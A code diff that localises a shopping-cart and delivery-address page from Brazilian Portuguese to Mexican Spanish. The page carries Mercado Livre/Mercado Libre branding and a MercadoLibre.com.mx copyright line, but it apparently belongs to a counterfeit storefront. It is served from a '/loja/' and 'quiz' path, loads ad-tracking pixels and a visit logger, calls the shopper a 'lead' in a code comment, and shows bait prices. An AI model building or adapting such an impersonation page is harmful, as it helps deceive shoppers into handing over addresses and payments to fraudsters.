@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="es-MX">
 <head>
 
 <!-- Google tag (gtag.js) -->
@@ -14,7 +14,7 @@
 <script src="/js/api-base.js"></script><script src="/js/fb-pixel.js"></script><script src="/js/tiktok-pixel.js"></script><script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Seu Carrinho - Mercado Livre</title>
+    <title>Tu Carrito - Mercado Libre</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link rel="icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
     <link rel="shortcut icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
@@ -359,15 +359,15 @@
 <script src="/js/loja-cart.js" defer></script></head>
 <body>
     <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">
-         Finalize sua compra com segurança
+         Finaliza tu compra con total seguridad
     </div>
      
     <nav class="navbar" style="padding-top: 15px;">
         <div class="menu-icon" style="padding-left: 3%;" onclick="window.location.href='../'">
-            <span style="font-family: 'GellixMedium'; color: black; cursor: pointer;">❮ Voltar</span>
+            <span style="font-family: 'GellixMedium'; color: black; cursor: pointer;">❮ Volver</span>
         </div>
         <div class="logo-central">
-            <img src="../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Livre">
+            <img src="../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Libre">
         </div>
         <div class="menu-icon" style="padding-right: 3%;">
             <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 0px; color: black">lock</span>
@@ -377,10 +377,10 @@
     <!-- Carrinho com itens -->
     <div class="cart-container" id="cartContainer" style="display: none;">
         <button class="back-to-cart" id="backToCart" onclick="showCartStep()">
-            ❮ Voltar para o carrinho
+            ❮ Volver al carrito
         </button>
         
-        <h1 class="cart-title">Seu Carrinho <span id="itemCountTitle" style="font-size: 14px; color: #999;"></span></h1>
+        <h1 class="cart-title">Tu Carrito <span id="itemCountTitle" style="font-size: 14px; color: #999;"></span></h1>
         
         <div id="cartItems" class="cart-items-wrapper">
             <!-- Items serao inseridos dinamicamente via JS -->
@@ -388,88 +388,88 @@
 
         <!-- Address Form -->
         <div class="address-form" id="addressForm">
-            <h2 class="form-title">Endereço de entrega</h2>
+            <h2 class="form-title">Dirección de entrega</h2>
             
             <div class="form-group">
-                <label for="cep">CEP *</label>
+                <label for="cep">Código postal *</label>
                 <input type="text" id="cep" maxlength="9" placeholder="00000-000">
-                <span class="error-message" id="cepError">CEP inválido</span>
+                <span class="error-message" id="cepError">Código postal inválido</span>
             </div>
 
             <div class="form-row">
                 <div class="form-group">
                     <label for="estado">Estado *</label>
-                    <input type="text" id="estado" maxlength="2" placeholder="SP">
+                    <input type="text" id="estado" maxlength="2" placeholder="CDMX">
                     <span class="error-message" id="estadoError">Estado inválido</span>
                 </div>
                 <div class="form-group">
-                    <label for="cidade">Cidade *</label>
-                    <input type="text" id="cidade" placeholder="São Paulo">
-                    <span class="error-message" id="cidadeError">Cidade inválida</span>
+                    <label for="cidade">Ciudad / Municipio *</label>
+                    <input type="text" id="cidade" placeholder="Ciudad de México">
+                    <span class="error-message" id="cidadeError">Ciudad inválida</span>
                 </div>
             </div>
 
             <div class="form-group">
-                <label for="bairro">Bairro *</label>
+                <label for="bairro">Colonia *</label>
                 <input type="text" id="bairro" placeholder="Centro">
-                <span class="error-message" id="bairroError">Bairro inválido</span>
+                <span class="error-message" id="bairroError">Colonia inválida</span>
             </div>
 
             <div class="form-row">
                 <div class="form-group" style="flex: 2;">
-                    <label for="rua">Rua *</label>
-                    <input type="text" id="rua" placeholder="Nome da rua">
-                    <span class="error-message" id="ruaError">Rua inválida</span>
+                    <label for="rua">Calle *</label>
+                    <input type="text" id="rua" placeholder="Nombre de la calle">
+                    <span class="error-message" id="ruaError">Calle inválida</span>
                 </div>
                 <div class="form-group" style="flex: 1;">
-                    <label for="numero">Número *</label>
+                    <label for="numero">Número exterior *</label>
                     <input type="text" id="numero" placeholder="123">
                     <span class="error-message" id="numeroError">Número inválido</span>
                 </div>
             </div>
 
             <div class="form-group">
-                <label for="complemento">Complemento (opcional)</label>
-                <input type="text" id="complemento" placeholder="Apto, bloco, etc">
+                <label for="complemento">Número interior / Depto (opcional)</label>
+                <input type="text" id="complemento" placeholder="Depto, edificio, etc.">
             </div>
         </div>
 
         <!-- Shipping Options -->
         <div class="shipping-options" id="shippingOptions">
-            <h2 class="form-title">Escolha a forma de entrega</h2>
+            <h2 class="form-title">Elige la forma de entrega</h2>
             
             <div class="shipping-option" id="shippingFree" onclick="selectShipping('free')">
                 <input type="radio" name="shipping" value="free" class="shipping-option-radio" checked>
                 <div class="shipping-option-info">
-                    <div class="shipping-option-name">Correios - Grátis</div>
-                    <div class="shipping-option-time">Entrega em até 7 dias úteis</div>
+                    <div class="shipping-option-name">Paquetería - Gratis</div>
+                    <div class="shipping-option-time">Entrega en hasta 7 días hábiles</div>
                 </div>
-                <div class="shipping-option-price free">GRÁTIS</div>
+                <div class="shipping-option-price free">GRATIS</div>
             </div>
 
             <div class="shipping-option" id="shippingFull" onclick="selectShipping('full')">
                 <input type="radio" name="shipping" value="full" class="shipping-option-radio">
                 <div class="shipping-option-info">
-                    <div class="shipping-option-name">Mercado Envios Full / Sedex</div>
-                    <div class="shipping-option-time">Entrega em até 3 dias úteis</div>
+                    <div class="shipping-option-name">Mercado Envíos Full / Paquetería express</div>
+                    <div class="shipping-option-time">Entrega en hasta 3 días hábiles</div>
                 </div>
-                <div class="shipping-option-price" id="fullShippingPrice">R$ 16,44</div>
+                <div class="shipping-option-price" id="fullShippingPrice">$59</div>
             </div>
         </div>
 
         <!-- Cart Summary -->
         <div class="cart-summary">
             <div class="summary-row">
-                <span>Produtos (<span id="summaryCount">0</span>)</span>
-                <span id="summarySubtotal">R$ 0,00</span>
+                <span>Productos (<span id="summaryCount">0</span>)</span>
+                <span id="summarySubtotal">$9</span>
             </div>
             <div class="summary-row">
-                <span>Frete</span>
-                <span id="summaryShipping" style="color: #00a650;">Grátis</span>
+                <span>Envío</span>
+                <span id="summaryShipping" style="color: #00a650;">Gratis</span>
             </div>
             <div class="summary-total">
                 <span>Total</span>
-                <span id="summaryTotal">R$ 0,00</span>
+                <span id="summaryTotal">$9</span>
             </div>
             
             <button class="checkout-btn" id="checkoutBtn">Continuar</button>
@@ -484,13 +484,13 @@
     <div class="cart-container" id="emptyCart" style="display: none;">
         <div class="empty-cart">
             <span class="material-symbols-outlined empty-cart-icon">shopping_cart_off</span>
-            <p class="empty-text">Seu carrinho esta vazio</p>
-            <a href="/loja/" class="continue-btn">Ver ofertas do dia</a>
+            <p class="empty-text">Tu carrito está vacío</p>
+            <a href="/loja/" class="continue-btn">Ver ofertas del día</a>
         </div>
     </div>
 
     <div style="margin-top: 40px; border-top: 1px solid #ddd; padding: 20px; text-align: center; font-family: 'GellixRegular'; color: #999; font-size: 12px;">
-        <p>© 1999-2024 Ebazar.com.br LTDA.</p>
+        <p>© 1999-2024 MercadoLibre.com.mx</p>
     </div>
 
     <!-- Script do Carrinho -->
@@ -567,7 +567,7 @@
             // Atualiza exibição do frete
             const shippingElement = document.getElementById('summaryShipping');
             if (shippingCost === 0) {
-                shippingElement.textContent = 'Grátis';
+                shippingElement.textContent = 'Gratis';
                 shippingElement.style.color = '#00a650';
             } else {
                 shippingElement.textContent = Cart.formatPrice(shippingCost);
@@ -712,7 +712,7 @@
                 currentStep = 'shipping';
                 shippingOptions.classList.add('active');
                 backBtn.classList.add('active');
-                document.getElementById('checkoutBtn').textContent = 'Ir para pagamento';
+                document.getElementById('checkoutBtn').textContent = 'Continuar al pago';
                 
                 // Garante que a opção grátis está selecionada por padrão
                 selectShipping('free');
@@ -738,7 +738,7 @@
                     document.getElementById('numero').value = address.numero || '';
                     document.getElementById('complemento').value = address.complemento || '';
                 } catch (e) {
-                    console.error('Erro ao carregar endereço:', e);
+                    console.error('Error al cargar dirección:', e);
                 }
             }
         }
@@ -767,17 +767,17 @@
                 
                 if (!input.value.trim()) {
                     input.classList.add('error');
-                    error.textContent = 'Campo obrigatório';
+                    error.textContent = 'Campo obligatorio';
                     error.style.display = 'block';
                     isValid = false;
                 } else if (field === 'cep' && !validateCEP(input.value)) {
                     input.classList.add('error');
-                    error.textContent = 'CEP inválido';
+                    error.textContent = 'Código postal inválido';
                     error.style.display = 'block';
                     isValid = false;
                 } else if (field === 'estado' && input.value.trim().length !== 2) {
                     input.classList.add('error');
-                    error.textContent = 'Use a sigla do estado (ex: SP)';
+                    error.textContent = 'Usa la abreviatura del estado (ej: CDMX)';
                     error.style.display = 'block';
                     isValid = false;
                 }
@@ -844,7 +844,7 @@
                 }
             } catch (error) {
                 // Se der erro, o lead preenche manualmente
-                console.log('CEP não encontrado, preenchimento manual necessário');
+                console.log('Código postal no encontrado, llenado manual necesario');
             }
         }
 
@@ -916,7 +916,7 @@
             
             const shippingData = {
                 type: selectedShipping,
-                name: selectedShipping === 'full' ? 'Mercado Envios Full / Sedex' : 'Correios - Grátis',
+                name: selectedShipping === 'full' ? 'Mercado Envíos Full / Paquetería express' : 'Paquetería - Gratis',
                 cost: shippingCost,
                 days: selectedShipping === 'full' ? 3 : 7,
                 subtotal: subtotal,
